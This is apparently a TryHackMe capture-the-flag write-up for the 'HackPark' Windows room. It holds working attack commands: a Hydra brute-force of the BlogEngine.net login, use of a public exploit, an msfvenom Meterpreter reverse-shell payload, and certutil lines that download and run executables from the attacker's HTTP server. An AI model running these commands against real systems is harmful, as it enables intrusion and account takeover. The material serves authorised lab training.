---
title: HackPark WriteUp
description: Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine
tags:
- writeups
- tryhackme
- windows
- passwordattack
---
## Enumeration

Initial port scan

```bash
export TARGET_IP="10.10.172.216"
nmap -Pn $TARGET_IP
```

Output
```bash
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
```

So we have RDP and a HTTP server

Website appears to be an aspx based CMS "blogengine.net"

Attempting to login makes a POST request to `/Account/login.aspx`

## Web Access

```bash
hydra -I -l admin -P /usr/share/wordlists/rockyou.txt 10.10.172.216 http-post-form '/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=EWGN3t6CyJTEWk%2FRgVv08LEg21xa3%2FIWO0YF1Z6fNbOzdTtNdjEi6adB5p794MlT2qq45TpeZKlI2KU04RVSb%2BhTZTi30ad7m4oqX0EM9qPfXl6cIpx14itIc9YnfBtMEcZepgWs8dybyBv3n4PjKa1rDgQD9xGjxAAUTUTz2sidxIwN&__EVENTVALIDATION=1jIK9zCZ3IE2OlqMT8JAnCqjc%2BenU2dN36%2Fsbwmgn%2Bt0QRR78NSzX8o1V15PehbuBX%2BdOBImNsPSPHIgneX6%2FRnQzSiS2T%2Fozd2wcSjsFMVUFHjmu4WBX7TGO5qwubiNTfLi3VtgPEj4bG%2BA8jqxcGb2VButcFMaAJW4zjWhCRkrRrXD&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed' -f
```
Takes a few mins but get
```
[80][http-post-form] host: 10.10.172.216   login: admin   password: 
```

Once logged in with above creds, going to ABOUT show version is 3.3.6.0

## Initial Access

Searching exploit-db found https://www.exploit-db.com/exploits/46353

I saved the file and changed the IP and port to my own before uploading through the Content > Post > Upload

I visited http://10.10.172.216//?theme=../../App_Data/files to trigger the exploit

## Meterpreter

Generated a shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 'LHOST=10.4.32.196' LPORT=8081 -f exe > shell.exe
```

Started a msfconsole multi handler

Ran a `python -m http.server`

Downloaded and ran the shell from the cmd shell with
```
certutil.exe -urlcache -split -f "http://10.4.32.196:8000/shell.exe" C:\users\public\shell.exe
START /B /I C:\users\public\shell.exe
```

## PrivEsc

By looking in C:\Program Files (x86) a strange directory called SystemScheduler was found

The corresponding Windows service was `windowsscheduler`


## Without metasploit

```
certutil.exe -urlcache -split -f "http://10.4.32.196:8000/winPEASany.exe" C:\users\public\winpeasany.exe
START /B /I C:\users\public\shell.exe
```
